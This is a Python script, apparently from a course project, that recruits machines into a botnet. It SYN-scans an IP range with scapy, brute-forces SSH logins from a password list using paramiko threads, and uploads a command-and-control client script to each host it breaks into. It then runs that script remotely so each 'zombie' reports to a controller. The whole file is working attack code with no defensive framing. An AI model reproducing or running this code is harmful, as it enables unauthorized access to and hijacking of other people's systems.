from scapy.all import *
import paramiko
import threading

paramiko.util.log_to_file("connections.log")

#zombievms = raw_input("Enter the number of Zombie VM's")

clientslist = list()
threadpool = list()
connectresults = list()
successclients = list()
def tryandconnect(ipaddresses,passwordsource,successfullyconnectedclients):
	try:
		client = paramiko.SSHClient()
		client.load_system_host_keys()
		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		client.connect(ipaddresses,password=passwordsource)
		client.exec_command('rm /root/ConnecttoCNC.py')
		client.exec_command('touch /root/ConnecttoCNC.py')
		client.exec_command('rm /root/Config.txt')
		client.exec_command('touch Config.txt')
		sftp = client.open_sftp()
		sftp.put('/root/CS445-Project/ConnecttoCNC.py','/root/ConnecttoCNC.py')
		sftp.put('/root/CS445-Project/Config.txt', '/root/Config.txt')
		successfullyconnectedclients.append(client)
	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException) as e:
		#print(e)
		return None


def generaterangeofipstoconnect(rangestr):
	listofips = []
	for index in range(255):
		listofips.append(rangestr + '.' + str(index))

	print(listofips)

	return listofips


IP_RANGE = ' '

with open('Config.txt', 'r') as file:
	content = file.readlines()
	line = content[2]
	IP_RANGE = line[14:]

print('IP RANGE  = ', IP_RANGE)

listofopenipaddresses = []

for index in range(255):
	ipaddress = IP_RANGE + str(index)
	answer = sr1(IP(dst=ipaddress)/TCP(dport=80,flags="S"))
	if answer != None:
		if answer.haslayer(TCP):
			if answer[TCP].flags == 18:
				listofopenipaddresses.append(ipaddress)


for index in range(len(listofopenipaddresses)):
	#SSH into machine
	with open("Passwords.txt",'r') as file:
		content = file.readlines()
		listofpasswords = [index.strip() for index in content]
		for row in listofpasswords:
			t = threading.Thread(target=tryandconnect, args = (listofopenipaddresses[index],row,successclients))
			threadpool.append(t)
			t.start()

		for threadresult in threadpool:
			threadresult.join()

		for successclientsiterator in successclients:
			stdin,stdout,stderr = successclientsiterator.exec_command('python /root/ConnecttoCNC.py')
			

